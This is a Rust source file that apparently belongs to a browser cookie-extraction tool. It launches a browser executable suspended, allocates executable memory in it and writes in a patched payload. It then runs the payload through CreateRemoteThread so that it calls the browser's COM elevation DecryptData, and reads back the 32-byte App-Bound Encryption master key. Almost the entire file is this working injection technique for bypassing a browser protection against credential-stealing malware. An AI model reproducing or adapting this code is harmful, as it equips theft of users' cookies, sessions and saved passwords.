use anyhow::{anyhow, bail, Result};
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::time::Duration;
use zeroize::Zeroizing;

use super::constants::*;
use super::pe::find_export_file_offset;

const DEFAULT_WAIT_TIMEOUT: Duration = Duration::from_secs(30);
const ENV_ENC_KEY_B64: &str = "HBD_ABE_ENC_B64";

struct EnvGuard {
  key: &'static str,
  prev_val: Option<String>,
}

impl EnvGuard {
  fn set(key: &'static str, value: &str) -> Self {
    let prev_val = std::env::var(key).ok();
    std::env::set_var(key, value);
    Self { key, prev_val }
  }
}

impl Drop for EnvGuard {
  fn drop(&mut self) {
    match &self.prev_val {
      Some(val) => std::env::set_var(self.key, val),
      None => std::env::remove_var(self.key),
    }
  }
}

struct TempUddGuard {
  path: PathBuf,
}

impl TempUddGuard {
  fn create() -> Result<Self> {
    let mut temp = std::env::temp_dir();
    let rand_suffix: u64 = rand::random();
    temp.push(format!("rookie-abe-udd-{:016x}", rand_suffix));
    std::fs::create_dir_all(&temp)?;
    Ok(Self { path: temp })
  }
}

impl Drop for TempUddGuard {
  fn drop(&mut self) {
    let _ = std::fs::remove_dir_all(&self.path);
  }
}

#[cfg(windows)]
struct ProcessHandlesGuard {
  h_process: windows::Win32::Foundation::HANDLE,
  h_thread: windows::Win32::Foundation::HANDLE,
  terminated: bool,
}

#[cfg(windows)]
impl ProcessHandlesGuard {
  fn new(
    h_process: windows::Win32::Foundation::HANDLE,
    h_thread: windows::Win32::Foundation::HANDLE,
  ) -> Self {
    Self {
      h_process,
      h_thread,
      terminated: false,
    }
  }

  fn terminate(&mut self, exit_code: u32) {
    use windows::Win32::System::Threading::{TerminateProcess, WaitForSingleObject};

    if !self.terminated && !self.h_process.is_invalid() {
      unsafe {
        let _ = TerminateProcess(self.h_process, exit_code);
        let _ = WaitForSingleObject(self.h_process, 2000);
      }
      self.terminated = true;
    }
  }
}

#[cfg(windows)]
impl Drop for ProcessHandlesGuard {
  fn drop(&mut self) {
    use windows::Win32::Foundation::CloseHandle;

    self.terminate(1);
    if !self.h_thread.is_invalid() {
      unsafe {
        let _ = CloseHandle(self.h_thread);
      }
    }
    if !self.h_process.is_invalid() {
      unsafe {
        let _ = CloseHandle(self.h_process);
      }
    }
  }
}

#[cfg(windows)]
fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>> {
  use windows::core::PCSTR;
  use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

  let kernel32 = unsafe { GetModuleHandleA(PCSTR(c"kernel32.dll".as_ptr().cast())) }?;
  let ntdll = unsafe { GetModuleHandleA(PCSTR(c"ntdll.dll".as_ptr().cast())) }?;

  let p_load_library_a =
    unsafe { GetProcAddress(kernel32, PCSTR(c"LoadLibraryA".as_ptr().cast())) };
  let p_get_proc_address =
    unsafe { GetProcAddress(kernel32, PCSTR(c"GetProcAddress".as_ptr().cast())) };
  let p_virtual_alloc = unsafe { GetProcAddress(kernel32, PCSTR(c"VirtualAlloc".as_ptr().cast())) };
  let p_virtual_protect =
    unsafe { GetProcAddress(kernel32, PCSTR(c"VirtualProtect".as_ptr().cast())) };
  let p_nt_flush_ic =
    unsafe { GetProcAddress(ntdll, PCSTR(c"NtFlushInstructionCache".as_ptr().cast())) };

  let load_library_a =
    p_load_library_a.ok_or_else(|| anyhow!("failed to resolve LoadLibraryA"))? as usize;
  let get_proc_address =
    p_get_proc_address.ok_or_else(|| anyhow!("failed to resolve GetProcAddress"))? as usize;
  let virtual_alloc =
    p_virtual_alloc.ok_or_else(|| anyhow!("failed to resolve VirtualAlloc"))? as usize;
  let virtual_protect =
    p_virtual_protect.ok_or_else(|| anyhow!("failed to resolve VirtualProtect"))? as usize;
  let nt_flush_ic =
    p_nt_flush_ic.ok_or_else(|| anyhow!("failed to resolve NtFlushInstructionCache"))? as usize;

  if payload.len() < BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET + 8 {
    bail!("payload too small for import patch");
  }

  let mut patched = payload.to_vec();
  let write_addr = |buf: &mut [u8], offset: usize, addr: usize| {
    buf[offset..offset + 8].copy_from_slice(&(addr as u64).to_le_bytes());
  };

  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET,
    load_library_a,
  );
  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET,
    get_proc_address,
  );
  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET,
    virtual_alloc,
  );
  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET,
    virtual_protect,
  );
  write_addr(&mut patched, BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET, nt_flush_ic);

  Ok(patched)
}

/// Spawns a target browser executable in suspended mode, injects the ABE extraction payload,
/// issues the COM elevation DecryptData call inside the browser context, and reads back the 32-byte master key.
#[cfg(windows)]
pub fn inject_and_extract_key(
  exe_path: &Path,
  payload: &[u8],
  encrypted_key_b64: &str,
) -> Result<Zeroizing<Vec<u8>>> {
  use windows::core::{PCWSTR, PWSTR};
  use windows::Win32::Foundation::{CloseHandle, WAIT_OBJECT_0, WAIT_TIMEOUT};
  use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
  use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
  };
  use windows::Win32::System::Threading::{
    CreateProcessW, CreateRemoteThread, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTUPINFOW,
  };

  let bootstrap_offset = find_export_file_offset(payload, "Bootstrap")?;
  let patched_payload = patch_preresolved_imports(payload)?;

  let _env_guard = EnvGuard::set(ENV_ENC_KEY_B64, encrypted_key_b64);
  let udd_guard = TempUddGuard::create()?;

  let cmd_line = format!(
    "\"{}\" --user-data-dir=\"{}\"",
    exe_path.display(),
    udd_guard.path.display()
  );
  let mut cmd_line_w: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
  let app_name_w: Vec<u16> = exe_path
    .as_os_str()
    .encode_wide()
    .chain(std::iter::once(0))
    .collect();

  let si = STARTUPINFOW {
    cb: std::mem::size_of::<STARTUPINFOW>() as u32,
    ..Default::default()
  };
  let mut pi = PROCESS_INFORMATION::default();

  let created = unsafe {
    CreateProcessW(
      PCWSTR(app_name_w.as_ptr()),
      PWSTR(cmd_line_w.as_mut_ptr()),
      None,
      None,
      false,
      CREATE_SUSPENDED,
      None,
      None,
      &si,
      &mut pi,
    )
  };

  if created.is_err() {
    bail!(
      "CreateProcessW failed for browser executable {:?}: {:?}",
      exe_path,
      created.err()
    );
  }

  let mut proc_guard = ProcessHandlesGuard::new(pi.hProcess, pi.hThread);

  let remote_base = unsafe {
    VirtualAllocEx(
      pi.hProcess,
      None,
      patched_payload.len(),
      MEM_COMMIT | MEM_RESERVE,
      PAGE_EXECUTE_READWRITE,
    )
  };

  if remote_base.is_null() {
    bail!("VirtualAllocEx failed in target browser process");
  }

  let mut written = 0;
  let write_ok = unsafe {
    WriteProcessMemory(
      pi.hProcess,
      remote_base,
      patched_payload.as_ptr() as *const _,
      patched_payload.len(),
      Some(&mut written),
    )
  };

  if write_ok.is_err() || written != patched_payload.len() {
    bail!(
      "WriteProcessMemory short write (wrote {} / {} bytes)",
      written,
      patched_payload.len()
    );
  }

  // Resume the main thread briefly so ntdll loader initialization completes
  unsafe {
    let _ = ResumeThread(pi.hThread);
  }
  std::thread::sleep(Duration::from_millis(50));

  let entry_addr = (remote_base as usize + bootstrap_offset) as *const ();
  let mut thread_id = 0;
  let remote_thread = unsafe {
    CreateRemoteThread(
      pi.hProcess,
      None,
      0,
      Some(std::mem::transmute::<
        *const (),
        unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
      >(entry_addr)),
      None,
      0,
      Some(&mut thread_id),
    )
  };

  let remote_thread = match remote_thread {
    Ok(h) if !h.is_invalid() => h,
    Err(e) => bail!("CreateRemoteThread failed: {e}"),
    _ => bail!("CreateRemoteThread returned invalid handle"),
  };

  let wait_state =
    unsafe { WaitForSingleObject(remote_thread, DEFAULT_WAIT_TIMEOUT.as_millis() as u32) };
  let _ = unsafe { CloseHandle(remote_thread) };

  if wait_state == WAIT_TIMEOUT {
    bail!(
      "Remote Bootstrap thread timed out after {:?}",
      DEFAULT_WAIT_TIMEOUT
    );
  } else if wait_state != WAIT_OBJECT_0 {
    bail!(
      "Remote Bootstrap thread wait failed (code 0x{:x})",
      wait_state.0
    );
  }

  // Read scratch result
  let mut hdr = [0u8; 12];
  let mut read_bytes = 0;
  let read_hdr_ok = unsafe {
    ReadProcessMemory(
      pi.hProcess,
      (remote_base as usize + BOOTSTRAP_MARKER_OFFSET) as *const _,
      hdr.as_mut_ptr() as *mut _,
      hdr.len(),
      Some(&mut read_bytes),
    )
  };

  if read_hdr_ok.is_err() || read_bytes != hdr.len() {
    bail!("Failed to read scratch diagnostic header from remote process");
  }

  let marker = hdr[0];
  let status = hdr[1];
  let err_code = hdr[2];
  let hresult = u32::from_le_bytes(hdr[4..8].try_into().unwrap());
  let com_err = u32::from_le_bytes(hdr[8..12].try_into().unwrap());

  let mut scratch = ScratchResult {
    marker,
    status,
    err_code,
    hresult,
    com_err,
    key: None,
  };

  if status == BOOTSTRAP_KEY_STATUS_READY {
    let mut key_buf = vec![0u8; BOOTSTRAP_KEY_LEN];
    let mut key_read_bytes = 0;
    let read_key_ok = unsafe {
      ReadProcessMemory(
        pi.hProcess,
        (remote_base as usize + BOOTSTRAP_KEY_OFFSET) as *const _,
        key_buf.as_mut_ptr() as *mut _,
        key_buf.len(),
        Some(&mut key_read_bytes),
      )
    };
    if read_key_ok.is_ok() && key_read_bytes == BOOTSTRAP_KEY_LEN {
      scratch.key = Some(key_buf);
    }
  }

  // Terminate the temporary browser process
  proc_guard.terminate(0);

  if let Some(key) = scratch.key.take() {
    if key.len() == BOOTSTRAP_KEY_LEN {
      return Ok(Zeroizing::new(key));
    }
  }

  bail!(
    "App-Bound reflective injection did not return valid key: {}",
    format_abe_error(&scratch)
  )
}

#[cfg(not(windows))]
pub fn inject_and_extract_key(
  _exe_path: &Path,
  _payload: &[u8],
  _encrypted_key_b64: &str,
) -> Result<Zeroizing<Vec<u8>>> {
  bail!("Reflective injection is only available on Windows")
}
